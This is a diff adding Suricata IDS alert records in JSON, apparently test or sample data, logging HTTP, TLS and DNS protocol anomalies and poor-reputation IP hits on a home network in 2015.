+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 2221014,
+      "rev": 1,
+      "signature": "SURICATA HTTP missing Host header",
+      "category": "Generic Protocol Command Decode",
+      "severity": 3
+    },
+    "http": {
+      "url": "/tmUnblock.cgi",
+      "http_content_type": "text/html",
+      "http_method": "GET",
+      "protocol": "HTTP/1.1",
+      "status": 400,
+      "length": 226
+    },
+    "vars": {
+      "flowints": {
+        "http.anomaly.count": 1
+      }
+    },
+    "app_proto": "http",
+    "flow": {
+      "pkts_toserver": 5,
+      "pkts_toclient": 5,
+      "bytes_toserver": 369,
+      "bytes_toclient": 756,
+      "start": "2015-03-27T07:41:30.618781-0600"
+    }
+  },
+  {
+    "timestamp": "2015-03-21T16:50:04.392100-0600",
+    "flow_id": 1608778610413630,
+    "pcap_cnt": 138245,
+    "event_type": "alert",
+    "src_ip": "222.186.21.70",
+    "src_port": 49391,
+    "dest_ip": "192.168.0.2",
+    "dest_port": 80,
+    "proto": "TCP",
+    "tx_id": 0,
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 2221015,
+      "rev": 1,
+      "signature": "SURICATA HTTP Host header ambiguous",
+      "category": "Generic Protocol Command Decode",
+      "severity": 3
+    },
+    "http": {
+      "hostname": "https",
+      "url": "https://accounts.google.com/ServiceLogin",
+      "http_user_agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2145.4 Safari/537.36",
+      "http_content_type": "text/html",
+      "http_method": "CONNECT",
+      "protocol": "HTTP/1.1",
+      "status": 400,
+      "length": 226
+    },
+    "vars": {
+      "flowints": {
+        "http.anomaly.count": 2
+      }
+    },
+    "app_proto": "http",
+    "flow": {
+      "pkts_toserver": 4,
+      "pkts_toclient": 4,
+      "bytes_toserver": 485,
+      "bytes_toclient": 654,
+      "start": "2015-03-21T16:50:00.233534-0600"
+    }
+  },
+  {
+    "timestamp": "2015-03-13T05:48:29.379561-0600",
+    "flow_id": 790852973354742,
+    "pcap_cnt": 172294,
+    "event_type": "alert",
+    "src_ip": "195.12.232.145",
+    "src_port": 80,
+    "dest_ip": "192.168.0.54",
+    "dest_port": 53559,
+    "proto": "TCP",
+    "tx_id": 0,
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 2221021,
+      "rev": 1,
+      "signature": "SURICATA HTTP response header invalid",
+      "category": "Generic Protocol Command Decode",
+      "severity": 3
+    },
+    "http": {
+      "hostname": "cdn.kmplayer.com",
+      "url": "/KMP/player/ini/goods/old_SE_unicode_20150306092010.7z",
+      "http_user_agent": "NSIS_Inetc (Mozilla)",
+      "http_content_type": "application/x-7z-compressed",
+      "http_method": "GET",
+      "protocol": "HTTP/1.1",
+      "status": 200,
+      "length": 4537
+    },
+    "vars": {
+      "flowints": {
+        "http.anomaly.count": 1
+      }
+    },
+    "app_proto": "http",
+    "flow": {
+      "pkts_toserver": 8,
+      "pkts_toclient": 7,
+      "bytes_toserver": 842,
+      "bytes_toclient": 6706,
+      "start": "2015-03-13T05:48:27.450294-0600"
+    }
+  },
+  {
+    "timestamp": "2015-03-21T16:50:04.392100-0600",
+    "flow_id": 1608778610413630,
+    "pcap_cnt": 138245,
+    "event_type": "alert",
+    "src_ip": "222.186.21.70",
+    "src_port": 49391,
+    "dest_ip": "192.168.0.2",
+    "dest_port": 80,
+    "proto": "TCP",
+    "http": {
+      "hostname": "https",
+      "url": "https://accounts.google.com/ServiceLogin",
+      "http_user_agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2145.4 Safari/537.36",
+      "http_content_type": "text/html",
+      "http_method": "CONNECT",
+      "protocol": "HTTP/1.1",
+      "status": 400,
+      "length": 226
+    },
+    "vars": {
+      "flowints": {
+        "http.anomaly.count": 2
+      }
+    },
+    "app_proto": "http",
+    "flow": {
+      "pkts_toserver": 4,
+      "pkts_toclient": 4,
+      "bytes_toserver": 485,
+      "bytes_toclient": 654,
+      "start": "2015-03-21T16:50:00.233534-0600"
+    },
+    "tx_id": 0,
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 2221027,
+      "rev": 1,
+      "signature": "SURICATA HTTP Host part of URI is invalid",
+      "category": "Generic Protocol Command Decode",
+      "severity": 3
+    }
+  },
+  {
+    "timestamp": "2015-03-17T02:17:14.069279-0600",
+    "flow_id": 1830819518295900,
+    "pcap_cnt": 146756,
+    "event_type": "alert",
+    "src_ip": "54.235.163.229",
+    "src_port": 32808,
+    "dest_ip": "192.168.0.2",
+    "dest_port": 80,
+    "proto": "TCP",
+    "tx_id": 0,
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 2221028,
+      "rev": 1,
+      "signature": "SURICATA HTTP Host header invalid",
+      "category": "Generic Protocol Command Decode",
+      "severity": 3
+    },
+    "http": {
+      "url": "/",
+      "http_content_type": "text/html",
+      "http_method": "PROPFIND",
+      "protocol": "HTTP/1.0",
+      "status": 405,
+      "length": 236
+    },
+    "vars": {
+      "flowints": {
+        "http.anomaly.count": 1
+      }
+    },
+    "app_proto": "http",
+    "flow": {
+      "pkts_toserver": 4,
+      "pkts_toclient": 4,
+      "bytes_toserver": 321,
+      "bytes_toclient": 743,
+      "start": "2015-03-17T02:17:13.798556-0600"
+    }
+  },
+  {
+    "timestamp": "2015-03-20T10:50:46.227082-0600",
+    "flow_id": 801197423415104,
+    "pcap_cnt": 118779,
+    "event_type": "alert",
+    "src_ip": "108.88.109.67",
+    "src_port": 51074,
+    "dest_ip": "192.168.0.2",
+    "dest_port": 80,
+    "proto": "TCP",
+    "tx_id": 0,
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 2221029,
+      "rev": 1,
+      "signature": "SURICATA HTTP URI terminated by non-compliant character",
+      "category": "Generic Protocol Command Decode",
+      "severity": 3
+    },
+    "http": {
+      "http_content_type": "text/html",
+      "status": 408,
+      "length": 221
+    },
+    "vars": {
+      "flowints": {
+        "http.anomaly.count": 2
+      }
+    },
+    "app_proto": "http",
+    "app_proto_ts": "failed",
+    "flow": {
+      "pkts_toserver": 5,
+      "pkts_toclient": 4,
+      "bytes_toserver": 380,
+      "bytes_toclient": 657,
+      "start": "2015-03-20T10:50:25.347968-0600"
+    }
+  },
+  {
+    "timestamp": "2015-03-20T10:50:46.227082-0600",
+    "flow_id": 801197423415104,
+    "pcap_cnt": 118779,
+    "event_type": "alert",
+    "src_ip": "108.88.109.67",
+    "src_port": 51074,
+    "dest_ip": "192.168.0.2",
+    "dest_port": 80,
+    "proto": "TCP",
+    "http": {
+      "http_content_type": "text/html",
+      "status": 408,
+      "length": 221
+    },
+    "vars": {
+      "flowints": {
+        "http.anomaly.count": 2
+      }
+    },
+    "app_proto": "http",
+    "app_proto_ts": "failed",
+    "flow": {
+      "pkts_toserver": 5,
+      "pkts_toclient": 4,
+      "bytes_toserver": 380,
+      "bytes_toclient": 657,
+      "start": "2015-03-20T10:50:25.347968-0600"
+    },
+    "tx_id": 0,
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 2221030,
+      "rev": 1,
+      "signature": "SURICATA HTTP METHOD terminated by non-compliant character",
+      "category": "Generic Protocol Command Decode",
+      "severity": 3
+    }
+  },
+  {
+    "timestamp": "2015-03-20T18:50:48.286010-0600",
+    "flow_id": 40186940724821,
+    "pcap_cnt": 5514,
+    "event_type": "alert",
+    "src_ip": "189.41.141.241",
+    "src_port": 50883,
+    "dest_ip": "192.168.0.2",
+    "dest_port": 80,
+    "proto": "TCP",
+    "http": {
+      "length": 417
+    },
+    "vars": {
+      "flowints": {
+        "http.anomaly.count": 2
+      }
+    },
+    "app_proto": "http",
+    "app_proto_ts": "failed",
+    "flow": {
+      "pkts_toserver": 4,
+      "pkts_toclient": 4,
+      "bytes_toserver": 292,
+      "bytes_toclient": 657,
+      "start": "2015-03-20T18:50:27.169557-0600"
+    },
+    "tx_id": 0,
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 2221031,
+      "rev": 1,
+      "signature": "SURICATA HTTP Request line with leading whitespace",
+      "category": "Generic Protocol Command Decode",
+      "severity": 3
+    }
+  },
+  {
+    "timestamp": "2015-04-08T07:48:54.117740-0600",
+    "flow_id": 1934671001006650,
+    "pcap_cnt": 154045,
+    "event_type": "alert",
+    "src_ip": "192.168.0.53",
+    "src_port": 3401,
+    "dest_ip": "85.195.90.199",
+    "dest_port": 80,
+    "proto": "TCP",
+    "tx_id": 1,
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 2221033,
+      "rev": 1,
+      "signature": "SURICATA HTTP Request abnormal Content-Encoding header",
+      "category": "Generic Protocol Command Decode",
+      "severity": 3
+    },
+    "http": {
+      "url": "/libhtp::request_uri_not_seen",
+      "length": 594
+    },
+    "vars": {
+      "flowints": {
+        "http.anomaly.count": 1
+      }
+    },
+    "app_proto": "http",
+    "flow": {
+      "pkts_toserver": 5,
+      "pkts_toclient": 4,
+      "bytes_toserver": 616,
+      "bytes_toclient": 1307,
+      "start": "2015-04-08T07:48:53.963130-0600"
+    }
+  },
+  {
+    "timestamp": "2015-04-06T12:46:43.158576-0600",
+    "flow_id": 1360576191294387,
+    "pcap_cnt": 111218,
+    "event_type": "alert",
+    "src_ip": "91.190.216.26",
+    "src_port": 12350,
+    "dest_ip": "192.168.0.54",
+    "dest_port": 57469,
+    "proto": "TCP",
+    "tx_id": 0,
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 2230003,
+      "rev": 1,
+      "signature": "SURICATA TLS invalid handshake message",
+      "category": "Generic Protocol Command Decode",
+      "severity": 3
+    },
+    "tls": {
+      "version": "TLSv1"
+    },
+    "vars": {
+      "flowints": {
+        "tls.anomaly.count": 2
+      }
+    },
+    "app_proto": "tls",
+    "flow": {
+      "pkts_toserver": 6,
+      "pkts_toclient": 5,
+      "bytes_toserver": 676,
+      "bytes_toclient": 335,
+      "start": "2015-04-06T12:46:42.617395-0600"
+    }
+  },
+  {
+    "timestamp": "2015-03-11T03:57:49.425143-0600",
+    "flow_id": 1337517536047498,
+    "pcap_cnt": 257489,
+    "event_type": "alert",
+    "src_ip": "192.168.0.51",
+    "src_port": 35736,
+    "dest_ip": "108.175.144.81",
+    "dest_port": 443,
+    "proto": "TCP",
+    "tx_id": 0,
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 2230010,
+      "rev": 1,
+      "signature": "SURICATA TLS invalid record/traffic",
+      "category": "Generic Protocol Command Decode",
+      "severity": 3
+    },
+    "tls": {
+      "sni": "www.arvixe.com",
+      "version": "0xb084"
+    },
+    "vars": {
+      "flowints": {
+        "tls.anomaly.count": 2
+      }
+    },
+    "app_proto": "tls",
+    "flow": {
+      "pkts_toserver": 6,
+      "pkts_toclient": 4,
+      "bytes_toserver": 595,
+      "bytes_toclient": 1905,
+      "start": "2015-03-11T03:57:49.061834-0600"
+    }
+  },
+  {
+    "timestamp": "2015-03-11T03:57:49.425143-0600",
+    "flow_id": 1337517536047498,
+    "pcap_cnt": 257489,
+    "event_type": "alert",
+    "src_ip": "192.168.0.51",
+    "src_port": 35736,
+    "dest_ip": "108.175.144.81",
+    "dest_port": 443,
+    "proto": "TCP",
+    "tls": {
+      "sni": "www.arvixe.com",
+      "version": "0xb084"
+    },
+    "vars": {
+      "flowints": {
+        "tls.anomaly.count": 2
+      }
+    },
+    "app_proto": "tls",
+    "flow": {
+      "pkts_toserver": 6,
+      "pkts_toclient": 4,
+      "bytes_toserver": 595,
+      "bytes_toclient": 1905,
+      "start": "2015-03-11T03:57:49.061834-0600"
+    },
+    "tx_id": 0,
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 2230015,
+      "rev": 1,
+      "signature": "SURICATA TLS invalid record version",
+      "category": "Generic Protocol Command Decode",
+      "severity": 3
+    }
+  },
+  {
+    "timestamp": "2015-04-08T00:54:30.796298-0600",
+    "flow_id": 1429883675476385,
+    "pcap_cnt": 79136,
+    "event_type": "alert",
+    "src_ip": "192.168.0.1",
+    "src_port": 53,
+    "dest_ip": "192.168.0.53",
+    "dest_port": 1252,
+    "proto": "UDP",
+    "tx_id": 34,
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 2240001,
+      "rev": 2,
+      "signature": "SURICATA DNS Unsolicited response",
+      "category": "Generic Protocol Command Decode",
+      "severity": 3
+    },
+    "app_proto": "dns",
+    "flow": {
+      "pkts_toserver": 43,
+      "pkts_toclient": 38,
+      "bytes_toserver": 3431,
+      "bytes_toclient": 5394,
+      "start": "2015-04-07T23:28:44.131489-0600"
+    }
+  },
+  {
+    "timestamp": "2015-03-20T12:48:25.961043-0600",
+    "flow_id": 1340877708044819,
+    "pcap_cnt": 131176,
+    "event_type": "alert",
+    "src_ip": "71.6.165.200",
+    "src_port": 40082,
+    "dest_ip": "192.168.0.2",
+    "dest_port": 22,
+    "proto": "TCP",
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 2403365,
+      "rev": 43922,
+      "signature": "ET CINS Active Threat Intelligence Poor Reputation IP group 66",
+      "category": "Misc Attack",
+      "severity": 2
+    },
+    "flow": {
+      "pkts_toserver": 1,
+      "pkts_toclient": 0,
+      "bytes_toserver": 64,
+      "bytes_toclient": 0,
+      "start": "2015-03-20T12:48:25.961043-0600"
+    }
+  },
+  {
+    "timestamp": "2015-03-20T08:25:11.020406-0600",
+    "flow_id": 2065989559078838,
+    "pcap_cnt": 102922,
+    "event_type": "alert",
+    "src_ip": "89.21.95.216",
+    "src_port": 36418,
+    "dest_ip": "192.168.0.54",
+    "dest_port": 55269,
+    "proto": "UDP",
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 2403390,
+      "rev": 43922,
+      "signature": "ET CINS Active Threat Intelligence Poor Reputation IP group 91",
+      "category": "Misc Attack",
+      "severity": 2
+    },
+    "app_proto": "failed",
+    "flow": {
+      "pkts_toserver": 1,
+      "pkts_toclient": 0,
+      "bytes_toserver": 64,
+      "bytes_toclient": 0,
+      "start": "2015-03-20T08:25:11.020406-0600"
+    }
+  },
+  {
+    "timestamp": "2015-03-21T02:20:25.821320-0600",
+    "flow_id": 1525285321803848,
+    "pcap_cnt": 51463,
+    "event_type": "alert",
+    "src_ip": "93.174.93.218",
+    "src_port": 54075,
+    "dest_ip": "192.168.0.2",
+    "dest_port": 80,
+    "proto": "TCP",
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 2403399,
+      "rev": 43922,
+      "signature": "ET CINS Active Threat Intelligence Poor Reputation IP group 100",
+      "category": "Misc Attack",
+      "severity": 2
+    },
+    "flow": {
+      "pkts_toserver": 1,
+      "pkts_toclient": 0,
+      "bytes_toserver": 64,
+      "bytes_toclient": 0,
+      "start": "2015-03-21T02:20:25.821320-0600"
+    }
+  }
+]
